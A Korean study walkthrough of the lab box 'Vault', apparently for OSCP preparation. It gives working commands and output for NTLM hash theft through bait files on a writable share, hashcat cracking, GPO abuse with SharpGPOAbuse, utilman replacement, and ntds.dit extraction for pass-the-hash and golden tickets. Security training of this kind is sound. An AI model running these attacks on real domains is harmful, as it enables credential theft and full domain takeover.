| GPT의 `GPT.ini` (SYSVOL) | `The version number in GPT.ini was increased successfully` |

> [!danger] 두 버전이 어긋나면 클라이언트가 정책을 새로 적용하지 않는다
> 클라이언트는 **GPC와 GPT의 버전을 비교**해서 "정책이 바뀌었는지" 판단한다. 하나만 올리고 다른 하나를 안 올리면 불일치로 간주해 무시하거나 오류가 난다. SharpGPOAbuse가 둘을 다 올리는 이유가 이것이다.
> **손으로 할 때 이 단계를 빠뜨리는 것이 가장 흔한 실패다** — `GptTmpl.inf`만 고치고 versionNumber를 안 올리면 `gpupdate /force`를 쳐도 아무 일도 안 일어난다.

`[+] The GPO does not specify any group memberships.` 라는 줄도 의미가 있다 — **원래 이 GPO에는 그룹 멤버십 설정이 없었다**는 뜻이다. 즉 SharpGPOAbuse가 기존 설정을 건드리지 않고 새 섹션을 추가했다. 원래 멤버십이 있었다면 덮어쓰지 않도록 주의해야 한다(정상 사용자를 관리자에서 빼버리면 눈에 띈다).

> [!tip] Kali 네이티브 대안 — `pygpoabuse` (업로드 없이)
> SharpGPOAbuse는 `.exe`라 타겟에 올려야 한다(AV 위험). `pygpoabuse`는 **Kali에서 원격으로** 같은 일을 한다:
> ```bash
> pygpoabuse.py vault.offsec/anirudh:SecureHM -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
>   -command 'net localgroup administrators anirudh /add' -f
> ```
> LDAP+SMB로 SYSVOL의 `GptTmpl.inf`를 직접 수정하고 버전을 올린다. **업로드가 없어 흔적이 적다.** (이 박스에서는 SharpGPOAbuse로 풀었다 — pygpoabuse는 실행하지 않았다.)

### 2-8. 강제 인증 공격을 언제 꺼내는가 — 신호 판독

이 박스와 [[Heist]]의 공통 교훈은 "쓰기 공유/URL 페치를 보면 미끼를 심어라"가 아니다. 그것은 결과다. **진짜 배울 것은 "어떤 신호를 보면 강제 인증으로 방향을 트는가"** 이고, 이것이 시험에서 재현된다.

강제 인증(coerced auth)이 성립하려면 **두 조건**이 동시에 필요하다:

1. **내가 UNC/URL을 심을 수 있는 곳** — 쓰기 공유(이 박스), 웹 `?url=`([[Heist]]), 프로필 경로, 이메일 서명, 채팅 첨부, 프린터 스풀러 API(PrinterBug/PetitPotam)
2. **그것을 열거나 처리하는 Windows 프로세스** — 사용자(피싱/시뮬레이션), 인덱싱 서비스, 백신 스캐너, 미리보기 핸들러

**신호 → 판단 대응표** (외워라):

| 열거 중 이것을 보면 | 강제 인증을 의심한다 |
|---|---|
| 익명/게스트 **쓰기** 가능한 공유 (`smbmap`의 `WRITE`) | ★ 미끼 파일 투하 → Responder. 이 박스 |
| 웹앱의 "URL 입력"·이미지 프록시·PDF 렌더러·웹훅 테스트 | ★ `?url=<KALI>` → Responder. [[Heist]] |
| 사용자 프로필/홈 디렉터리에 쓰기 가능 | `.url`·`desktop.ini`를 프로필 루트에 |
| MSSQL 접근권 (`xp_dirtree`) | `EXEC xp_dirtree '\\<KALI>\x'` → 서비스 계정 해시 |
| 프린터 스풀러(RPC) 열림 | PrinterBug(`SpoolSample`)·PetitPotam으로 **DC가 나에게 인증하도록 강제** |
| 아무 인증 실마리도 없는 AD 박스 | LLMNR/NBT-NS 포이즈닝(Responder 수동 대기) — 네트워크의 오타 조회를 가로챈다 |

> [!danger] 강제 인증을 얻은 다음의 갈림길 — 캡처인가 릴레이인가
> 해시가 손에 들어오면 **즉시 `nmap`의 `smb2-security-mode`를 다시 본다**:
> - `signing enabled and **required**` → 릴레이 불가 → **크랙**(이 박스·[[Heist]])
> - `signing enabled but **not required**` + **다른 호스트 존재** → **릴레이**(`ntlmrelayx`)가 훨씬 강력하다. 컴퓨터 계정처럼 크랙 불가능한 인증도 릴레이는 그대로 쓴다
>
> 단일 호스트 랩은 릴레이 대상이 없어 항상 크랙이다(§2-3). **시험 AD 세트(DC 1 + 멤버 2~3)에서는 이 판단이 갈린다** — 멤버 서버의 서명이 꺼져 있으면 DC의 인증을 그 멤버로 릴레이해 로컬 관리자를 얻는다.

**이 박스가 가르치는 핵심 반사**: "웹이 없다 → 막다른 길"이 아니라 "웹이 없다 → SMB 쓰기 공유를 찾아라 → 있으면 강제 인증". 진입로가 안 보이는 AD 박스에서 이 사고 하나가 시간을 가장 많이 아낀다.

---

## 3. Foothold

### 3-1. 미끼 파일 생성

```bash
┌──(kali㉿kali)-[~/git/ntlm_theft]
└─$ python ntlm_theft.py -g all -s 192.168.45.175 -f steal
Created: steal/steal.scf (BROWSE TO FOLDER)
Created: steal/steal-(url).url (BROWSE TO FOLDER)
Created: steal/steal-(icon).url (BROWSE TO FOLDER)
Created: steal/steal.lnk (BROWSE TO FOLDER)
Created: steal/steal.rtf (OPEN)
...
Created: steal/steal.library-ms (BROWSE TO FOLDER)
Created: steal/Autorun.inf (BROWSE TO FOLDER)
Created: steal/desktop.ini (BROWSE TO FOLDER)
Created: steal/steal.theme (THEME TO INSTALL
Generation Complete.
```

![[Pasted image 20260708103551.png]]

| 플래그 | 역할 | 틀리면 |
|---|---|---|
| `-g all` | 24종 전부 생성 | 특정 종류만 만들면 발동 안 하는 미끼에 걸려 헛수고 |
| `-s 192.168.45.175` | **미끼가 가리킬 UNC 서버 = 내 Kali** | **여기가 Responder의 바인딩 IP와 같아야 한다.** VPN 재연결로 다르면 인증이 아무 데도 안 온다 |
| `-f steal` | 출력 폴더 | |

**`-s`는 **IP로** 넣어라, 호스트명 말고**
미끼 안의 UNC 경로가 `\\<-s값>\...`이 된다. 호스트명을 넣으면 타겟이 그 이름을 해석해야 하는데, 타겟의 DNS에 내 Kali가 없다. **IP를 넣으면 이름 해석 단계가 통째로 생략**된다. (반대로, LLMNR/NBT-NS 포이즈닝을 노린다면 존재하지 않는 호스트명을 넣어 Responder가 그 이름을 가로채게 하는 전술도 있다 — 이 박스에서는 IP 직접 지정으로 충분했다.)

### 3-2. 미끼 투하

```bash
┌──(kali㉿kali)-[~/git/ntlm_theft/steal]
└─$ smbclient //192.168.120.172/DocumentsShare -N -c 'prompt OFF; mput *'
putting file steal.application as \steal.application (6.3 kB/s) (average 6.3 kB/s)
putting file steal-(stylesheet).xml as \steal-(stylesheet).xml ...
...
putting file steal.wax as \steal.wax (0.2 kB/s) (average 20.7 kB/s)
```

![[Pasted image 20260708103537.png]]

**명령 해부**

| 조각 | 역할 | 빼면 |
|---|---|---|
| `-N` | null 세션 | 익명 쓰기가 가능하므로 자격증명 불필요 |
| `-c '...'` | 비대화식 명령 실행 | 없으면 smbclient가 대화형 프롬프트로 들어가 스크립트가 안 된다 |
| `prompt OFF` | **파일마다 y/n 확인을 끈다** | 켜져 있으면 `mput`이 24번 확인을 물어 자동화가 멈춘다 |
| `mput *` | 현재 폴더의 모든 파일 업로드 | |

**`prompt OFF`가 없으면 `mput *`이 파일마다 멈춘다** — 이 한 조각이 24개 업로드를 무인화한다.

### 3-3. Responder 대기 → 캡처

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ sudo responder -I tun0
```

![[Pasted image 20260708103424.png]]

폴더를 여는 무언가가 미끼를 건드리자 해시가 들어왔다:

```bash
[SMB] NTLMv2-SSP Client   : 192.168.120.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:66134a3a082ecb7b:751AA3935EA2F39C8A6C49162F7C6AB5:010100000000000080A4BEC5C30EDD0145715E4350EED7450000000002000800540033005100580001001E00570049004E002D0058005800360043005A00490052004D0032005800380004003400570049004E002D0058005800360043005A00490052004D003200580038002E0054003300510058002E004C004F00430041004C000300140054003300510058002E004C004F00430041004C000500140054003300510058002E004C004F00430041004C000700080080A4BEC5C30EDD01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370035000000000000000000
```

![[Pasted image 20260708103353.png]]

**`NTLMv2-SSP Client : 192.168.120.172` — 소스가 타겟 IP다.** `[SMB]` 태그가 §2-4의 `cifs/` 판정과 일치한다.

**미끼가 안 물면 — 확인할 것**
이 박스는 폴더를 여는 주기적 동작이 있어 금방 물렸다. 안 물릴 때:
1. **Responder의 SMB 서버가 켜져 있나** — 배너의 `SMB server [ON]`. Kali 기본값은 On
2. **`-s`와 Responder IP가 같나** — VPN 재연결로 어긋나는 것이 1순위 원인
3. **미끼가 실제로 올라갔나** — `smbclient ... -c 'ls'`로 24개 존재 확인
4. **타겟이 폴더를 여나** — 실제 침투 상황이라면 사용자를 유도해야 한다(피싱). 랩은 시뮬레이션이 대신 열어준다

### 3-4. 크랙

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

potfile이 결과를 보존하고 있다(실측):

```bash
┌──(kali㉿kali)-[~]
└─$ grep -i '^ANIRUDH' ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
```

**획득: `vault.offsec\anirudh : SecureHM`** (NetNTLMv2, `-m 5600`).

**hashcat 명령이 히스토리에 한 번만 보이는 이유**
`~/.zsh_history`에는 `hashcat -m 5600 hash.txt ...`가 [[Heist]] 것 한 줄만 남아 있다. `~/.zshrc`가 `hist_ignore_dups` + `HISTSIZE=1000` + `hist_expire_dups_first`라 문자열이 같은 명령의 중복 벌이 만료됐다 `[가정]`. 그러나 **potfile에 두 박스의 크랙 결과가 모두 있다** — 이것이 두 번 실행됐다는 확정 증거다. 상세는 [[Heist]] §6-8.

### 3-5. 스윕 → WinRM → local.txt

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ nxc-sweep 192.168.120.172 -u 'anirudh' -p 'SecureHM'
[+] Port 445 open. Checking smb ...
SMB    192.168.120.172 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB    192.168.120.172 445 DC [+] vault.offsec\anirudh:SecureHM
SMB    192.168.120.172 445 DC [*] Enumerated shares
SMB    192.168.120.172 445 DC Share           Permissions     Remark
SMB    192.168.120.172 445 DC ADMIN$          READ            Remote Admin
SMB    192.168.120.172 445 DC C$              READ,WRITE      Default share
SMB    192.168.120.172 445 DC DocumentsShare
SMB    192.168.120.172 445 DC IPC$            READ            Remote IPC
SMB    192.168.120.172 445 DC NETLOGON        READ            Logon server share
SMB    192.168.120.172 445 DC SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM  192.168.120.172 5985 DC [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
WINRM  192.168.120.172 5985 DC [+] vault.offsec\anirudh:SecureHM (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP    192.168.120.172 3389 DC [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:vault.offsec) (nla:False)
RDP    192.168.120.172 3389 DC [+] vault.offsec\anirudh:SecureHM
```

![[Pasted image 20260708104729.png]]

**읽어야 할 것**: `C$ READ,WRITE`·`ADMIN$ READ` — anirudh는 [[Heist]]의 enox보다 SMB 권한이 넓다(Server Operators 멤버십 덕). `nla:False` — §4-4의 utilman 경로가 살아 있다. WinRM `(Pwn3d!)`는 **여전히 "인증 성공"의 의미일 뿐**이다([[Heist]] §2-6에서 소스로 확인).

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ evil-winrm -i 192.168.120.172 -u 'anirudh' -p 'SecureHM'

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd ..
*Evil-WinRM* PS C:\Users\anirudh> cd desktop
*Evil-WinRM* PS C:\Users\anirudh\desktop> type local.txt
5a3377f8afb97ee39a988c201052df14
```

![[Pasted image 20260708104942.png]]

⚠️ 대화형 셸(evil-winrm)에서 읽었으므로 시험 규정상 유효하다([[Butch]]).

---

## 4. 권한상승

### 4-1. BloodHound 수집 — Kerberos 폴백을 관측하다

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ bloodhound-python -u anirudh -p SecureHM -d Vault.offsec -ns 192.168.120.172 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vault.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.vault.offsec
INFO: Done in 00M 18S
```

![[Pasted image 20260708125002.png]]

> [!danger] `Failed to get Kerberos TGT ... dc.vault.offsec:88 ... Name or service not known` — 이 경고를 정확히 읽어라
> **`-ns`를 줬는데도 Kerberos가 실패했다.** 이유: `-ns`는 **LDAP 조회의 리졸버**만 바꾼다. Kerberos 단계는 **시스템 리졸버**로 `dc.vault.offsec:88`을 찾는데, Kali의 `/etc/hosts`·`/etc/resolv.conf`에 그 이름이 없다.
> 여기서는 NTLM으로 폴백해서 수집이 성공했다(위 출력의 `Found 5 users` 등). 하지만 **NTLM이 꺼진 도메인이라면 여기서 수집 자체가 실패**한다. 그때 필요한 것이:
> ```
> # /etc/hosts
> 192.168.120.172  DC.vault.offsec  vault.offsec  DC
> ```
> 이 함정의 상세와 SPN·이름 해석의 관계는 [[Heist]] §2-8·§4-1. 같은 경고를 [[Heist]]에서도 봤다 — 그래서 AD 박스에서는 `/etc/hosts` 등록을 반사적으로 하는 편이 낫다.

수집 규모가 이 박스의 단순함을 보여준다: 사용자 5명, 컴퓨터 1대. anirudh 외에 사람 계정은 Administrator뿐이다(Guest·krbtgt 제외):

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[].Properties | select(.enabled==true) | .samaccountname' 20260708124927_users.json
```
관측 결과 활성 계정은 `anirudh` · `Administrator` · `Guest` 셋뿐이다(JSON `enabled==true` 기준). **피벗할 옆 사용자가 없다** → 남은 것은 anirudh의 권한으로 곧장 관리자로 올라가는 것이다.

### 4-2. 그래프에서 경로 확정

BloodHound에서 anirudh를 시작점으로 잡으면 §2-5의 세 엣지(`GenericWrite`·`WriteOwner`·`WriteDacl` → `Default Domain Policy`)가 나온다. **이것이 이 박스의 권한상승 경로다.**

> [!warning] BloodHound 데이터는 수집 시점 스냅샷이다 — 이 박스에서 실제로 물렸다
> JSON 파일명 `20260708124927_*`은 **12:49:27에 찍은 사진**이다. §4-3에서 GPO를 고쳐 anirudh를 로컬 관리자에 넣지만, 그 변경은 이 스냅샷에 없다. 확인하려면 재수집해야 한다.
> 그래서 §4-3의 검증을 그래프가 아니라 **`net localgroup administrators`(살아 있는 상태 조회)** 로 했다. **변경을 만든 뒤에는 그래프가 아니라 실물을 확인하라.** 상세는 [[Heist]] §4-1.

### 4-3. GPO 악용 — SharpGPOAbuse

```bash
┌──(kali㉿kali)-[~/git]
└─$ git clone https://github.com/byronkg/SharpGPOAbuse.git
```

![[Pasted image 20260708131710.png]]

컴파일된 `.exe`를 타겟에 올려 실행:

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> iwr 192.168.45.175/SharpGPOAbuse.exe -o SharpGPOAbuse.exe
*Evil-WinRM* PS C:\Users\anirudh\desktop> .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

![[Pasted image 20260708132007.png]]

**출력을 한 줄씩 읽는다**

| 줄 | 의미 |
|---|---|
| `SID Value of anirudh = ...-1103` | 추가할 계정의 SID를 확정. **`GptTmpl.inf`에는 이름이 아니라 SID로 기록**된다 |
| `File exists: ...\GptTmpl.inf` | 고칠 보안 템플릿 파일을 SYSVOL에서 찾음. **이 경로에 쓸 수 있다는 것이 `GenericWrite`의 실체** |
| `versionNumber attribute changed` | LDAP의 GPO 객체 `versionNumber`를 올림 |
| `version number in GPT.ini was increased` | SYSVOL의 `GPT.ini`도 올림. 두 버전이 일치해야 클라이언트가 "정책이 바뀌었다"고 인식한다 |
| `Wait for the GPO refresh cycle` | 핵심 — 변경은 다음 정책 새로고침에 반영된다(§4-4) |

**명령 조각**

| 조각 | 역할 |
|---|---|
| `--AddLocalAdmin` | 제한된 그룹(Restricted Groups) 방식으로 로컬 Administrators에 추가 |
| `--GPOName "Default Domain Policy"` | 내가 쓰기 권한을 가진 GPO. **따옴표 필수**(공백 포함) |
| `--UserAccount anirudh` | 관리자로 승격할 계정 = 나 자신 |

> [!tip] `--AddComputerTask` 대안 — 즉시 SYSTEM 실행
> `--AddLocalAdmin`은 anirudh를 관리자로 만들 뿐 **재로그온**이 필요하다(토큰에 그룹 반영). 더 빠른 것은 `--AddComputerTask`로 **즉시 예약 작업**을 심어 SYSTEM으로 리버스셸을 바로 실행하는 것이다:
> ```
> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "x" --Author DC\Administrator \
>   --Command "cmd.exe" --Arguments "/c <payload>" --GPOName "Default Domain Policy"
> ```
> (이 박스에서는 `--AddLocalAdmin`으로 풀었다 — 위 형태는 실행하지 않았다.)

### 4-4. `gpupdate /force` — 왜 필요하고 무엇을 하나

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

![[Pasted image 20260708132047.png]]

**`gpupdate /force`가 하는 일과, DC에서만 통하는 이유**
그룹 정책은 기본적으로 **90분(±30분 랜덤)** 마다, DC는 **5분**마다 새로고침된다. 공격이 SYSVOL 파일을 고쳐도 그 주기가 돌아야 로컬 Administrators에 실제로 반영된다.
`gpupdate /force`는 그 주기를 지금 당장 강제한다. `/force`는 "바뀐 것만"이 아니라 **모든 정책을 다시 적용**한다(SharpGPOAbuse가 versionNumber를 올렸으니 `/force` 없이도 바뀐 것으로 인식되지만, 확실히 하려고 `/force`).
이 명령을 칠 수 있는 것은 내가 이미 DC에 셸(anirudh)을 갖고 있기 때문이다. 실제 침투에서 대상이 워크스테이션이면 그 머신에서 주기를 기다리거나 사용자 재로그온을 유도해야 한다. 랩에서는 내가 곧 대상 위에 있으므로 즉시 당길 수 있다.

### 4-5. 검증 → 셸 재실행 → proof.txt

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```

![[Pasted image 20260708132134.png]]

**`anirudh`가 Administrators에 들어갔다.** 이 확인을 그래프가 아니라 실물 조회로 한 이유는 §4-2에 있다.

**새 그룹 멤버십은 새 로그온 토큰에만 반영된다** — 그래서 evil-winrm 세션을 **끊고 다시 붙는다**. 새 세션의 토큰에 Administrators가 들어 있어 관리자 파일이 읽힌다:

```powershell
*Evil-WinRM* PS C:\Users\administrator> cd desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> type proof.txt
714b4d1566a4bc88b9a0f45c33b36f0b
```

![[Pasted image 20260708132320.png]]

> [!warning] "관리자가 됐는데 파일이 안 읽힌다" → 재로그온을 안 했다
> 그룹 멤버십은 토큰 발급 시점에 스탬프된다. `net localgroup`에 이름이 보여도 현재 세션의 토큰은 옛날 것이라 접근이 거부된다. **반드시 새 세션**을 열어라. 이것이 GPO/그룹 기반 권한상승에서 가장 흔한 "왜 안 되지" 지점이다.

### 4-6. 다른 경로 A — `SeRestorePrivilege` (utilman + RDP)

anirudh의 특권을 보면 GPO 말고도 길이 있다:

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

![[Pasted image 20260708132526.png]]

**`SeRestorePrivilege`가 Enabled.** [[Heist]]의 `svc_apache$`와 정확히 같은 특권이다. utilman 치환 경로가 그대로 성립한다:

```powershell
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd c:\windows\system32
*Evil-WinRM* PS C:\windows\system32> ren utilman.exe utilman.old
*Evil-WinRM* PS C:\windows\system32> ren cmd.exe Utilman.exe
```

```bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /u:anirudh /p:SecureHM /v:192.168.120.172 /cert:ignore /sec:tls
```

RDP 로그인 후 **Win+U**를 누르면 `Utilman.exe`(=cmd.exe)가 SYSTEM으로 뜬다.

![[Pasted image 20260708134045.png]]

메커니즘·`nla:False` 전제조건·`xfreerdp3` 플래그 해설·원복 절차는 [[Heist]] §2-7·§4-4와 동일하다. **이 박스는 `nla:False`(§3-5)라 경로가 열려 있다.**

### 4-7. 다른 경로 B — `SeBackupPrivilege` (ntds.dit → DCSync 동급)

`whoami /priv`에 **`SeBackupPrivilege`도 Enabled**다. 이것이 이 박스에서 가장 "OSCP다운" 경로다 — **도메인 전체 해시를 뽑는다.** 아래 절차는 **이 박스에서 끝까지 실행하지 않았다**(GPO로 이미 풀렸으므로). 원본 노트에 "SebackupPrivilege 활용"으로 적혀 있던 것을 절차로 정리해 남긴다.

**`SeBackupPrivilege`가 왜 도메인 장악인가**
이 특권은 백업 목적이라 **모든 파일을 DACL 무시하고 읽을 수 있다.** DC에서 가장 중요한 파일은 `C:\Windows\NTDS\ntds.dit` — **도메인의 모든 계정 해시(krbtgt 포함)가 든 AD 데이터베이스**다. 평소에는 잠겨 있고 ACL로 보호되지만, `SeBackupPrivilege` 앞에서는 둘 다 무력하다.
`ntds.dit`(암호화됨) + `SYSTEM` 하이브(복호화 키)를 함께 뽑아 `secretsdump`에 넣으면 **DCSync와 동일한 결과** — 전 계정 NT 해시 — 를 얻는다.

**단계 1 — 잠긴 `ntds.dit` 복사** (라이브 파일이라 일반 복사는 실패, 두 방법)

방법 (a) — SeBackupPrivilege 전용 cmdlet (원본 노트가 택한 방법):
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite
reg save hklm\system C:\temp\system.hive
```

방법 (b) — diskshadow로 볼륨 섀도카피 후 백업 모드 복사(외부 DLL 불필요):
```
# ds.txt
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```
```powershell
diskshadow /s C:\temp\ds.txt
robocopy /b z:\Windows\NTDS C:\temp ntds.dit   # /b = 백업 모드 = SeBackupPrivilege 사용
reg save hklm\system C:\temp\system.hive
```

**단계 2 — Kali로 내려 해시 추출**
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

**단계 3 — Administrator NT 해시로 PtH, 또는 krbtgt로 골든 티켓**
```bash
impacket-psexec -hashes :<Admin_NThash> vault.offsec/Administrator@192.168.120.172
# 또는 krbtgt 해시로 도메인 영구 장악(Golden Ticket)
```

**`robocopy /b`의 `/b`를 빠뜨리면 실패한다**
`/b`(backup mode)가 있어야 robocopy가 `SeBackupPrivilege`를 사용해 잠기고 보호된 파일을 읽는다. 없으면 일반 복사가 되어 `ntds.dit`가 사용 중이라 거부된다. 같은 이유로 방법 (a)는 일반 `Copy-Item`이 아니라 `Copy-FileSeBackupPrivilege`를 쓴다.
위 명령들의 출력은 **관측한 것이 아니다** — 이 박스에서 실행하지 않았다. 절차의 형태만 기록한 것이다.

### 4-8. 세 경로 우열

| | A: GPO ACL (실사용) | B: SeRestore (utilman) | C: SeBackup (ntds.dit) |
|---|---|---|---|
| 근거 출처 | BloodHound 그래프 | `whoami /priv` | `whoami /priv` |
| 업로드 | SharpGPOAbuse.exe 1개 | 없음 | SeBackup DLL 2개 또는 없음(diskshadow) |
| 얻는 것 | **이 DC의** 로컬 관리자 | **이 DC의** SYSTEM | **도메인 전체 해시**(krbtgt 포함) |
| 지속성 | 재로그온 필요 · GPO 원복 필요 | 시스템 파일 원복 필요 | 해시는 영구(비번 변경 전까지) |
| 시험 가치 | 중간 | 낮음 | **가장 높음** — 골든티켓·크로스호스트 PtH로 확장 |

**시험이라면 C(SeBackup)를 노린다** — krbtgt 해시까지 얻으면 도메인을 영구 장악하고, 다른 호스트로의 피벗(PtH·골든티켓)까지 한 번에 열린다. 이 박스는 단일 호스트라 A로 충분했지만, AD 세트에서는 C가 판을 끝낸다.

---

## 5. 플래그

| 플래그 | 경로 | 값 | 얻은 계정 |
|---|---|---|---|
| `local.txt` | `C:\Users\anirudh\Desktop\local.txt` | `5a3377f8afb97ee39a988c201052df14` | `vault.offsec\anirudh` (WinRM) |
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `714b4d1566a4bc88b9a0f45c33b36f0b` | `Administrator` (GPO 후 재로그온 WinRM) |

둘 다 표준 위치, 둘 다 대화형 셸에서 읽었다.

---

## 6. 막혔던 지점 / 시행착오

`~/.zsh_history` 실측으로 재구성했다.

### 6-1. 익명 접근 표기를 8가지나 시도했다

```bash
smbclient -L 192.168.120.172 -N
smbclient //192.168.120.172/DocumentsShare -N
smbclient //192.168.120.172/DocumentsShare -u 'guest'
smbclient //192.168.120.172/ -U 'guest%guest'
smbclient //192.168.120.172/ -U 'guest'
smbclient //192.168.120.172/DocumentsShare -U 'guest'
smbclient //192.168.120.172/DocumentsShare -U 'anonymous'
nxc smb 192.168.120.172 -u '' -p '' --shares
nxc smb 192.168.120.172 -u 'guest' -p 'guest' --shares
nxc smb 192.168.120.172 -u 'anonymous' -p 'anonymous' --shares
```

**결국 통한 것은 `-N`과 `-U ''`다.** 나머지는 헛발질처럼 보이지만 필요한 확인이다 — 서버마다 익명을 받는 계정 이름이 달라서, 하나만 시도하고 "익명 불가"로 판단하면 진입점을 놓친다.

**교훈: 익명 SMB는 최소 `-N`·`-U ''`·`guest`·`anonymous` 넷을 시도한다.** 이것을 스크립트화한 것이 `nxc-sweep`이다.

### 6-2. 앞 박스 IP가 잔류했다 — `.175` vs `.172`

```bash
nxc smb 192.168.120.175 -u '' -p '' --shares
enum4linux-ng -A 192.168.120.175
ldapsearch -x -H 'ldap://192.168.120.175' -s base namingcontexts
impacket-GetNPUsers vault.offsec/ -userfile users.txt -no-pass -dc-ip 192.168.120.175
```

**타겟은 `.172`인데 `.175`를 쳤다.** `.175`는 앞서 풀던 [[Resourced]]의 IP다([[Heist]] §6-2와 같은 잔류 오류). 나중에 `.172`로 고쳐 다시 친 흔적이 히스토리에 그대로 있다.

**교훈: 박스마다 `mkdir <박스>; cd <박스>; nnmap <IP>`로 시작하면, `nmap.log`가 그 디렉터리의 정답 IP가 되어 잔류를 잡아준다.**

### 6-3. AS-REP 로스팅 시도 — 옵션 오타 + 사전인증 활성

```bash
impacket-GetNPUsers vault.offsec/ -userfile users.txt -no-pass -dc-ip 192.168.120.172
```

두 가지 문제.

첫째, **`-userfile`은 틀린 옵션이다.** Kali에서 실제 usage를 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers -h | grep -i usersfile
  -usersfile USERSFILE  File with user per line to test
```

**`-usersfile`(s가 붙는다)이다.** `-userfile`로 치면 인자 파싱에서 거부된다. 구체적 오류 문구는 히스토리에 없어 **관측된 것이 아니다.**

둘째, 옵션을 고쳤어도 결과는 없었을 것이다 — BloodHound가 답을 준다:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[].Properties | select(.dontreqpreauth==true) | .samaccountname' 20260708124927_users.json
(출력 없음)
```

**`DONT_REQ_PREAUTH`가 켜진 계정이 하나도 없다.** AS-REP 로스팅 대상이 존재하지 않는다. 게다가 `-usersfile`에 넣을 유효한 사용자 목록도 아직 없었다(이 시점엔 SMB 열거 전).

**교훈: AS-REP 로스팅은 (1) 유효한 사용자명 목록과 (2) 그중 사전인증 비활성 계정이 있어야 성립한다.** 둘 중 하나만 없어도 빈손이다. `-m 18200` 상세는 [[Heist]] §2-3.

### 6-4. `enum4linux-ng`로 자동 열거 시도

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ enum4linux-ng -A 192.168.120.175      # ← IP 오타(.175), 뒤에 .172로 정정
┌──(kali㉿kali)-[~/PG/Vault]
└─$ enum4linux-ng -A 192.168.120.172
```

